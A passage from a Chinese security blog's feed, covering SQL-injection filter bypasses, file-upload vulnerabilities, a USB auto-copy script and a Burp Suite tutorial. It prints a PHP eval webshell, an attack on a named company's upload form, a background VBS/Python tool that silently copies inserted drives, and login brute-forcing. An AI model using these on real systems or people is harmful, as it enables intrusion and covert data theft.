src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg05.png"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg06.png"></p><p>如果逗号无法使用，我们可以用offset，offset和limit同时用用法如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> column1, column2, columnN <br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> [<span class="hljs-keyword">no</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">rows</span>] <span class="hljs-keyword">OFFSET</span> [<span class="hljs-keyword">row</span> num]<br></code></pre></td></tr></table></figure><p>所以这里我们可以：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg07.png"></p><h2 id="0x09-比较符号绕过"><a href="#0x09-比较符号绕过" class="headerlink" title="0x09 比较符号绕过"></a>0x09 比较符号绕过</h2><p>在盲注的时候，很多时候要用到比较符号大于(&lt;)和小于(&gt;)来进行二分查找，如果目标对比较符号进行了过滤，我们就需要通过greatest和least等函数进行绕过，这两个函数用法如下：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">GREATEST</span>(<span class="hljs-params">value1, value2, ...</span>)</span>;<br><span class="hljs-function"><span class="hljs-title">LEAST</span>(<span class="hljs-params">value1,value2,...</span>)</span>;<br></code></pre></td></tr></table></figure><p>greatest函数会返回这些值里的最大值，least函数会返回最小值。如果我们要用刚才的mid方法比较，就需要这样构造：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">greatest(<span class="hljs-name">ascii</span>(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">150</span>)<br>least(<span class="hljs-name">ascii</span>(<span class="hljs-name">mid</span>(<span class="hljs-name">user</span>(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">150</span>)<br></code></pre></td></tr></table></figure><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>sql注入中常年作为owasp top 10中排名第一的漏洞，其危害不可小觑，有危害就有限制，有限制就有绕过，在这里比拼的是安全人员对漏洞原理的理解。如果作为防御方，更要有扎实的基本功，才能尽力避免这些问题。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>mysql</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2018/03/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/03/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是文件上传漏洞"><a href="#0x00-什么是文件上传漏洞" class="headerlink" title="0x00 什么是文件上传漏洞"></a>0x00 什么是文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。</p><h2 id="0x01-产生原因"><a href="#0x01-产生原因" class="headerlink" title="0x01 产生原因"></a>0x01 产生原因</h2><ul><li>未过滤或本地过滤<br>未过滤指没有限制任何格式的文件上传，这个时侯入侵者上传php文件，就可以直接利用。<br>本地过滤是在前端进行过滤，实际上相当于没有任何限制，入侵者可以通过抓包更改文件名直接绕过前端检查。</li><li>黑名单扩展名过滤<br>黑名单因为限制的扩展名不够完善，导致可以通过各种其他的扩展名绕过，比如大小写混用，或者同故宫其他同种意思的扩展名进行绕过。</li><li>文件头绕过<br>如上传图片文件时，在文件头加上图片文件的文件头如“GIF89a”，则可以绕过检查。</li><li>content-type绕过<br>content-type在http request的请求头里面，所以可以直接通过请求者抓包重发更改来绕过。</li></ul><h2 id="0x02-搭建环境"><a href="#0x02-搭建环境" class="headerlink" title="0x02 搭建环境"></a>0x02 搭建环境</h2><p>我们先尝试搭建一下文件上传漏洞的环境进行测试。<br>首先配置好lamp环境，然后在/var/www/html/test文件夹下，创建新的form.html文件，写入如下内容：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>php_upload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后创建upload_file.php，写入如下内容：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件大小: &quot;</span> . (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">&quot; kB&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在。 &quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储在: &quot;</span> . <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们在物理机中，写一个含有如下恶意代码的php文件：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a123456&#x27;</span>]) <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过访问虚拟机中的网页，将文件上传</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu02.png"></p><p>接着在浏览器访问/test/upload路径，可以看到我们的恶意代码已经上传</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu03.png"></p><p>然后我们打开菜刀，将恶意代码的url和我们设置的密码写进去，进行连接，发现获取了目的服务器的权限，可以非常自由的访问所有路径，甚至进行写文件操作。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu04.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu05.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu06.png"></p><h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>接下来我们用某公司网页进行一个实战，目前该漏洞已被修复，请不要再尝试  </p><p>在目的公司页面 <a href="http://asm.51welink.com/">http://asm.51welink.com</a> 注册账号登陆<br>登陆进去后发现可以上传证书，但是限制了zip格式  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu07.png"></p><p>同样我们写个和上面一样的php一句话木马，然后重命名成zip  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a123456&#x27;</span>]) <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过burpsuite抓包上传的数据包，更改文件格式为php，上传  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu08.png"></p><p>用菜刀连接，获取网站webshell。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu09.png"></p><h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul><li>1.应用白名单的方式过滤文件扩展名</li><li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li><li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于python的u盘自动拷贝工具</title>
    <link href="/2018/03/24/%E5%9F%BA%E4%BA%8Epython%E7%9A%84u%E7%9B%98%E8%87%AA%E5%8A%A8%E6%8B%B7%E8%B4%9D%E5%B7%A5%E5%85%B7/"/>
    <url>/2018/03/24/%E5%9F%BA%E4%BA%8Epython%E7%9A%84u%E7%9B%98%E8%87%AA%E5%8A%A8%E6%8B%B7%E8%B4%9D%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-需要用到的库"><a href="#0x00-需要用到的库" class="headerlink" title="0x00 需要用到的库"></a>0x00 需要用到的库</h2><ul><li>OS：OS库提供了使用各种操作系统功能的接口。主要有对目录或者文件的新建，删除，查看文件属性，还提供了对文件以及目录的路径操作。</li><li>shutil：对文件提供了移动，复制，打包，压缩等功能，这里主要用到复制功能。</li><li>time： 时间处理的库，在这里用来程序休眠的时间。  </li></ul><h2 id="0x01-程序设计思路"><a href="#0x01-程序设计思路" class="headerlink" title="0x01 程序设计思路"></a>0x01 程序设计思路</h2><p>我们需要每隔一段时间检查是否有u盘插入，如果检测到有u盘，则将u盘的内容全部拷贝到本机的指定文件夹。  </p><h2 id="0x02-最简单模式编程实现"><a href="#0x02-最简单模式编程实现" class="headerlink" title="0x02 最简单模式编程实现"></a>0x02 最简单模式编程实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> shutil<br>USB = <span class="hljs-string">&#x27;D:\\&#x27;</span>  <span class="hljs-comment"># u盘目录</span><br>SAVE = <span class="hljs-string">&#x27;C:\\Users\Leticia\Desktop\copy&#x27;</span>  <span class="hljs-comment"># 保存目录</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">usbcopy</span>():</span><br>    shutil.copytree(USB, SAVE)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> os.path.exists(USB):<br>            usbcopy()<br>        time.sleep(<span class="hljs-number">200</span>)  <span class="hljs-comment"># 休眠时间</span><br><br>main()<br></code></pre></td></tr></table></figure><p>此程序中，USB变量是u盘目录，根据个人电脑来填写，SAVE变量是将拷贝出来的文件保存的目录，time.sleep(200)代表每次判断完之后休眠200秒。<br>此时测试程序已经可以自动拷贝了，但是还存在一些问题，比如我们已经拷贝完成了，然后休眠完成之后u盘没有拔，这个时候会重新复制一遍。但是我们如果写成检测到u盘，拷贝一遍程序就停止运行，那么u盘内容发生变化我们要怎么做，所以我们还要加几个功能。  </p><h2 id="0x03-增加检测变化模块的编程实现"><a href="#0x03-增加检测变化模块的编程实现" class="headerlink" title="0x03 增加检测变化模块的编程实现"></a>0x03 增加检测变化模块的编程实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">from</span> os.path <span class="hljs-keyword">import</span> join,getsize<br>USB = <span class="hljs-string">&#x27;D:\\&#x27;</span>  <span class="hljs-comment"># u盘目录</span><br>SAVE = <span class="hljs-string">&#x27;C:\\Users\Leticia\Desktop\copy&#x27;</span>  <span class="hljs-comment"># 保存目录</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getdirsize</span>(<span class="hljs-params"><span class="hljs-built_in">dir</span></span>):</span><br>    size=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> root,dirs,files <span class="hljs-keyword">in</span> os.walk(<span class="hljs-built_in">dir</span>):<br>        size+=<span class="hljs-built_in">sum</span>([getsize(join(root,name)) <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files])<br>    <span class="hljs-built_in">print</span>(size)<br>    <span class="hljs-keyword">return</span> size<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">usbcopy</span>():</span><br>    shutil.copytree(USB, SAVE)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    old_dirsize = <span class="hljs-number">0</span><br>    new_dirsize = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> os.path.exists(USB):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;检测到U盘&quot;</span>)<br>            new_dirsize = getdirsize(USB)<br>            <span class="hljs-keyword">if</span> old_dirsize != new_dirsize:<br>                usbcopy()<br>                old_dirsize = new_dirsize<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有变化&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;暂时没有U盘&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始休眠&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 休眠时间</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;休眠结束&quot;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p>这里我们新加了一个getdirsize函数来遍历u盘文件并统计总大小，然后如果总大小改变，则拷贝，如果没变，就不重新拷贝。<br>这样就解决了文件更新的问题，根据下图print的提示我们可以看到大概的工作流程。  </p><h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>此时我们的代码可以运行了，但是如果我们拿到其他人电脑里，因为python环境等问题很大可能无法执行，所以我们可以借助前面一篇博客说过的  <a href="http://uuzdaisuki.com/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/">http://uuzdaisuki.com/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/</a> 将python程序打包成exe在其他电脑中使用。  </p><p>如果这样还觉得不方便的话，在这里再提供一个vbs的拷贝小脚本，同样能达到我们的功能，在txt中输入如下代码，然后根据个人路径稍作更改，然后讲后缀改成vbs，双击运行，就可以在后台自动拷贝了。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">set</span> fso=<span class="hljs-built_in">createobject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">set</span> ws=<span class="hljs-built_in">createobject</span>(<span class="hljs-string">&quot;wscript.shell&quot;</span>)<br><span class="hljs-keyword">on</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br><span class="hljs-keyword">do</span><br>wscript.sleep <span class="hljs-number">1000</span><br><span class="hljs-keyword">if</span> fso.driveexists(<span class="hljs-string">&quot;D:&quot;</span>) <span class="hljs-keyword">then</span><br>fso.copyfile <span class="hljs-string">&quot;D:*&quot;</span>,<span class="hljs-string">&quot;C:\Users\Leticia\Desktop\copy&quot;</span><br>fso.copyfolder <span class="hljs-string">&quot;D:*&quot;</span>,<span class="hljs-string">&quot;C:\Users\Leticia\Desktop\copy&quot;</span><br>wscript.sleep <span class="hljs-number">20000</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">loop</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite使用笔记</title>
    <link href="/2018/03/24/BurpSuite%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/03/24/BurpSuite%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-What-is-BurpSuite"><a href="#0x00-What-is-BurpSuite" class="headerlink" title="0x00 What is BurpSuite"></a>0x00 What is BurpSuite</h2><p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。  </p><h2 id="0x01-主要功能"><a href="#0x01-主要功能" class="headerlink" title="0x01 主要功能"></a>0x01 主要功能</h2><ul><li>1.Target(目标)——显示目标目录结构的的一个功能</li><li>2.Proxy（代理）——是一个拦截HTTP/S的代理服务器（抓包），作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</li><li>3.Spider（爬虫）——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li><li>4.Scanner（扫描器）[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。</li><li>5.Intruder（入侵）——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</li><li>6.Repeater（中继器）——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。</li><li>7.Sequencer（会话）——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li><li>8.Decoder（解码器）——是一个进行手动执行或对应用程序数据者智能解码编码的工具。</li><li>9.Comparer（对比）——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li><li>10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</li><li>11.Options(设置)——对Burp Suite的一些设置  </li></ul><p>我们这里主要来讲解一下其中的主要几个功能。</p><h2 id="0x02-代理功能"><a href="#0x02-代理功能" class="headerlink" title="0x02 代理功能"></a>0x02 代理功能</h2><p>首先是代理功能（Proxy），我们打开BurpSuite，点击进入到Proxy选项，<br>然后进入Options选项，我们可以看到默认的代理地址是127.0.0.1:8080，我们可以启用它，也可以自己add一个新的代理，比如我们输入127.0.0.1:8082。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp01.png"></p><p>然后在要使用的代理前面打勾。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp02.png"></p><p>然后在自己的浏览器中，将代理设置的与上面我们勾选的代理相同。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp03.png"></p><p>接下来打开Proxy功能中的Intercept选项卡，拦截功能为“Interception is on”状态则表示打开拦截，需要关闭时点击使它变成“Interception is off”状态即可。<br>在raw选项中可以看到web请求的请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。可以通过手工修改这些信息，对服务器端进行渗透测试。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp04.png"></p><p>Forward可以让请求进行到下一步，history选项框可以看到之前的请求。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp05.png"></p><h2 id="0x03-重放功能"><a href="#0x03-重放功能" class="headerlink" title="0x03 重放功能"></a>0x03 重放功能</h2><p>接下来我们介绍一下中继器（Repeater），我们在刚才捕捉到的请求中，点击右键-Send to Repeater，就可以看到Repeater按钮变色，然后我们点到这个选项中，就会发现Request中已经写入刚才我们send的请求。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp06.png"></p><p>我们可以在这里进行编辑重发，点击go，就可以在右边窗口可以看到响应。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp07.jpg"></p><p>在这里进行一些手工注入的测试是十分方便的。</p><h2 id="0x04-爆破功能"><a href="#0x04-爆破功能" class="headerlink" title="0x04 爆破功能"></a>0x04 爆破功能</h2><p>接下来介绍一下爆破功能（Intruder），这里以一个网站的后台为例。<br>这个后台的设计有个缺陷，就是如果登陆的时候，我们随意输入密码，然后用户名存在，就会提示权限不足，用户名不存在，就会显示输入的用户名或密码错误。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp08.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp09.png"></p><p>这里我们先用之前的代理功能，截断一次手动发送的请求。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp10.png"></p><p>然后右键Send to Intruder，这时可以在Intruder的Positions选项中看到刚才的web请求。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp11.png"></p><p>这里我们可以看到，所有能别提交的值都被加深了颜色，但是我们根据刚才的思路，应该是要爆破用户名，根据响应来判断用户名存在与否。所以我们先点击右侧的clear将所有加深的参数取消掉，然后手动圈选用户名部分我们提交的参数，点击右侧的add，仅将它选中。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp12.jpg"></p><p>在options选项中我们可以设置线程数和延时等一些设定，这次我们先保持默认。  </p><p>我们进入Payloads选项，在Payload Options中load一个账号字典文件进去，如果没有现有的字典文件，可以在 <a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a> 下载。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp13.png"></p><p>然后我们点击start attack按钮，可以看到测试速度要比自己手写脚本爆破快一些（但是如果你是社区版的burpsuite就会十分慢，会仅让你体验这个功能）</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp14.png"></p><p>等待字典文件跑完，我们可以点击lentgh，使它以响应的长度排序，就可以区分“权限不足”和“用户名和密码错误”的账号了，可以看到，这个小字典一共爆出了3个账号，这个时候我们可以用同样的办法，让密码变化，用密码字典来爆破这几个账号的密码。</p><p><img 